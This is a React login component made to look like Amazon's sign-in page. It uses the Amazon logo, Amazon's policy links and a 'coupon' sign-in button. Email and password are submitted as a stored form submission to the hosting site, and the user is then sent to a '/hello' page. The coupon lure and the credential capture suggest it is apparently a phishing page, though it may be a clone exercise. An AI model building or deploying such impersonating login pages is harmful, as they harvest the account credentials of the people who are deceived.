import { Formik, Field, Form } from "formik";
import { Link, useHistory } from "react-router-dom";

import Logo from '../images/amazon_logo_black.svg';

export default function Login() {
  const history = useHistory();

  function validateEmail(value) {
    let error;
    if (!value) {
      error = '*Required';
    } else if (!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$/i.test(value)) {
      error = '*Invalid email address';
    }
    return error;
  }
  
  function validatePassword(value) {
    let error = "";
    const passwordRegex = /(?=.*[0-9])/;
    if (!value) {
      error = "*Required";
    } else if (value.length < 8) {
      error = "*Password must be 8 characters long.";
    } else if (!passwordRegex.test(value)) {
      error = "*Invalid password. Must contain one number.";
    }
    return error;
  };

  const handleSubmit = e => {
    e.preventDefault()
    let formData = new FormData(e.target.closest('form'))
    fetch('/', {
      method: 'POST',
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData).toString()
    })
    .then(() => history.push('/hello'))
    .catch(error => console.log(error))
  }

  return (
    <main>
      <div className="login__page">
        <Link to='/' className='login__home'>
          <img src={Logo} alt="" />
        </Link>
        <Formik
          initialValues={{ email: "", password: "" }}
        >
          {({errors, touched}) => (
            <Form
              className='login__form'
              name="login"
              method="post"
              action='/'
              onSubmit={handleSubmit}
            >
              <h2>Sign-In</h2>

              <Field type="hidden" name="form-name" value="login" />

              <label htmlFor="email">Email</label>
              <Field id='email' name="email" type="email" autoComplete="off" validate={validateEmail} />
              {errors.email && touched.email && <div>{errors.email}</div>}

              <label htmlFor="password">Password</label>
              <Field id='password' name="password" type="password" validate={validatePassword} />
              {errors.password && touched.password && <div>{errors.password}</div>}

              <button className='coupon__signin' type="submit">Continue</button>

              <div className="policy">
                By continuing, you agree to Amazon's&nbsp;
                <a href='https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&nodeId=508088'>
                  Conditions of Use
                </a> and&nbsp;
                <a href='https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&nodeId=468496'>
                  Privacy Notice.
                </a>
              </div>
            </Form>
          )}
        </Formik> 
      </div>
    </main>
  )
}